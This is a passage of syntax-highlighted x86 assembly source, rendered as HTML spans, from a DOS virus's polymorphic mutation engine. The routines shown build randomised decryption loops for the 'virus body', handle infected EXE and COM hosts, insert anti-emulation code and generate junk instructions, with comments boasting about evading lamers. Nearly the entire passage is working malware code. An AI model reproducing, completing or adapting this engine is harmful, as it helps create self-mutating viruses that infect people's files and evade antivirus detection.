</span><span class="sc5">@@Repite002</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get index register (must be different</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">        </span><span class="sc1">; of counter register)</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">@@Repite002</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite002</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite002</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; Save it here</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonComoUsado</span><span class="sc0">   </span><span class="sc1">; Check if it is going to be used (to</span><span class="sc0">
                       </span><span class="sc1">; not use it on indexed memory writes)</span><span class="sc0">
</span><span class="sc5">@@Repite003</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">      </span><span class="sc1">; Get key register (the register that</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">        </span><span class="sc1">; is going to be used like decryption</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">        </span><span class="sc1">; key, if flags in BP says that). Of</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite003</span><span class="sc0">      </span><span class="sc1">; course, it must be different of the</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroIndice</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; other two</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite003</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroContador</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Repite003</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegistroEncriptado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonComoUsado</span><span class="sc0">   </span><span class="sc1">; Set if it can be used like index on</span><span class="sc0">
                       </span><span class="sc1">; indexed memory writes</span><span class="sc0">
     </span><span class="sc1">; This variable is set to avoid making a JMP instruction in the very</span><span class="sc0">
     </span><span class="sc1">; beginning of the decryptor</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PrimerByte</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">  </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">PrimerByte</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Use JMPs on decryptor</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonInt</span><span class="sc0">      </span><span class="sc1">; Put INT function</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">         </span><span class="sc1">; Get method of jumping to next de-</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C00h</span><span class="sc0">      </span><span class="sc1">; cryptor or decrypted virus body</span><span class="sc0">
        </span><span class="sc6">ROL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Estado</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">; Put it here</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">PonContador</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">  </span><span class="sc1">; Call this functions</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">PonIndice</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">   </span><span class="sc1">; in a random order: Pon-</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">PonEncriptador</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Contador to set</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">AntiEmulating</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; counter register,</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BarajaYLlama</span><span class="sc0">               </span><span class="sc1">; PonIndice to set index</span><span class="sc0">
                </span><span class="sc1">; register, PonEncriptador to set key register,</span><span class="sc0">
                </span><span class="sc1">; and AntiEmulating to... well, I think you</span><span class="sc0">
                </span><span class="sc1">; aren't sooooo lamer :)</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">InicLoop</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc1">; Decryption LOOP begins here</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">  </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">TipoEjec</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc1">; Is the host EXE or COM?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@EsCOM</span><span class="sc0">       </span><span class="sc1">; Jump if COM</span><span class="sc0">
     </span><span class="sc5">@@EsEXE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc0">     </span><span class="sc1">; Set "CS:" instruction</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@SAaslx</span><span class="sc0">      </span><span class="sc1">; Continue</span><span class="sc0">
     </span><span class="sc5">@@EsCOM</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random segment referring</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">     </span><span class="sc1">; CS:, DS:, ES:, SS:</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">     </span><span class="sc1">; If result is "DS:", don't insert it</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@SAaslx2</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">     </span><span class="sc1">; Convert it to this instruction</span><span class="sc0">
     </span><span class="sc5">@@SAaslx</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">           </span><span class="sc1">; Insert it</span><span class="sc0">
     </span><span class="sc5">@@SAaslx2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazEncriptador</span><span class="sc0">  </span><span class="sc1">; Put decryption instruction</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">IncrementaIndice</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Construct index</span><span class="sc0">
                               </span><span class="sc1">; increasement</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ModificaContador</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Construct counter</span><span class="sc0">
                               </span><span class="sc1">; in/decrementation</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">ModificaRegistro</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">; Construct key</span><span class="sc0">
                               </span><span class="sc1">; modification</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@@Retorno01</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">200h</span><span class="sc0">    </span><span class="sc1">; Direct return (no</span><span class="sc0">
                             </span><span class="sc1">; function)</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BarajaYLlama</span><span class="sc0">   </span><span class="sc1">; Call the three functions above in a</span><span class="sc0">
                       </span><span class="sc1">; random order</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MeteComprueba</span><span class="sc0">  </span><span class="sc1">; Construct counter check</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraSinBanderas</span><span class="sc0"> </span><span class="sc1">; Random instructions that don't</span><span class="sc0">
                         </span><span class="sc1">; change Zero Flag and/or Signe</span><span class="sc0">
                         </span><span class="sc1">; Flag</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MeteSaltoLoop</span><span class="sc0">  </span><span class="sc1">; Construct loop jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoopYaEsta</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">;Decryption loop is ended</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">   </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PonInt</span><span class="sc0">           </span><span class="sc1">; Do random interrupt function</span><span class="sc0">
                         </span><span class="sc1">; (or not, it's random :)   )</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">   </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SaltoInicio</span><span class="sc0">      </span><span class="sc1">; Put jump to virus body or second</span><span class="sc0">
                         </span><span class="sc1">; decryptor</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria</span><span class="sc0">   </span><span class="sc1">; Do garbage</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Calculate length of decryptor</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; in DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LongDesencrip</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0"> </span><span class="sc1">; Put result here</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Banderas</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">  </span><span class="sc1">; Save flags here</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
        </span><span class="sc6">POPA</span><span class="sc0">                 </span><span class="sc1">; Restore registers and return</span><span class="sc0">
 </span><span class="sc5">@@Retorno01</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">HazVirus2</span><span class="sc0">   </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;; Procedure to mix BX, CX, DX and SI registers and call the addresses in them</span><span class="sc0">
</span><span class="sc1">;; randomly</span><span class="sc0">
</span><span class="sc5">BarajaYLlama</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0005</span><span class="sc0">     </span><span class="sc1">; Repeat 5 times</span><span class="sc0">
  </span><span class="sc5">@@Loop1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto1</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; Exchange</span><span class="sc0">
    </span><span class="sc5">@@Salto1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto2</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; Exchange</span><span class="sc0">
    </span><span class="sc5">@@Salto2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Idem</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto3</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; Idem</span><span class="sc0">
    </span><span class="sc5">@@Salto3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SioNo</span><span class="sc0">        </span><span class="sc1">; Id.</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Salto4</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; I.  :)</span><span class="sc0">
    </span><span class="sc5">@@Salto4</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Loop1</span><span class="sc0">        </span><span class="sc1">; Repeat</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Put addresses on stack, so, when</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; the functions arrive to "RET", they</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">       </span><span class="sc1">; jump to next function. Last will</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; return completely.</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">BarajaYLlama</span><span class="sc0">    </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;;;; GARBAGE GENERATOR</span><span class="sc0">
</span><span class="sc1">;; Almost all polymorphism in this engine depends on this powerful procedure.</span><span class="sc0">
</span><span class="sc1">;; It can generate a lot of different types of garbage, from CALLs to indexed</span><span class="sc0">
</span><span class="sc1">;; memory writes, conditional jumps, 32 bit instructions and much more.</span><span class="sc0">
</span><span class="sc1">;; All memory writes are done to the virus body! :)</span><span class="sc0">
</span><span class="sc5">HazBasuraAleatoria</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EstoyDentro</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Initialize variable.</span><span class="sc0">
                     </span><span class="sc1">; When generating a CALL, this is set to</span><span class="sc0">
                     </span><span class="sc1">; 1 to not generate nested CALLs</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">      </span><span class="sc1">; Save going-to-be-used registers</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Get a random word in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salto</span><span class="sc0">       </span><span class="sc1">; Jump with 75% probability</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PrimerByte</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; First instruction on</span><span class="sc0">
                              </span><span class="sc1">; decryptor?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Salxtro</span><span class="sc0">     </span><span class="sc1">; If not, jump</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">; Set bit 15 and 14 to non-zero</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@Salto</span><span class="sc0">       </span><span class="sc1">; Jump and don't do "JMP"</span><span class="sc0">
   </span><span class="sc5">@@Salxtro</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">      </span><span class="sc1">; Do jump with non-zero displacement</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@SLLL</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">@@SLLL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Aleatorio</span><span class="sc0">   </span><span class="sc1">; Aleatory in AX</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">   </span><span class="sc1">; Generate a random type of conditional "JMP"</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">   </span><span class="sc1">; Generate probabilities</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">JBE</span><span class="sc0">   </span><span class="sc5">@@PonSaltoNormal</span><span class="sc0"> </span><span class="sc1">; Jump with 50% of probability</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@PonJCXZ</span><span class="sc0">   </span><span class="sc1">; Jump with 25% of probability</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">  </span><span class="sc1">; Do JMP (with 25% ...)</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@JKJCJD</span><span class="sc0">
   </span><span class="sc5">@@PonJCXZ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc0">  </span><span class="sc1">; Do JCXZ</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc5">@@JKJCJD</span><span class="sc0">
   </span><span class="sc5">@@PonSaltoNormal</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">; Do normal conditional jump</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc0">
   </span><span class="sc5">@@JKJCJD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">    </span><span class="sc1">; Set this to 0 and save this offset address</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporal</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Restore AX</span><span class="sc0">

      </span><span class="sc5">@@Salto</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">    </span><span class="sc1">; Get AL between 0 and 3</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">@@Fin</span><span class="sc0">   </span><span class="sc1">; If 0, jump</span><span class="sc0">
      </span><span class="sc5">@@Loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">HazBasuraAleatoria2</span><span class="sc0"> </span><span class="sc1">; Generate random instructions</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Recover AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">    </span><span class="sc1">; Repeat AL times</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Loop</span><span class="sc0">
      </span><span class="sc5">@@Fin</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">    </span><span class="sc1">; AH=0?</span><span class="sc0">
        </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">@@Fin2</span><span class="sc0">      </span><span class="sc1">; If not, a JMP isn't be constructed</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">    </span><span class="sc1">; Get current offset in AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temporal</span><span class="sc4">-</span><span class="sc2">200h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Calculate displacement until the</span><span class="sc0">
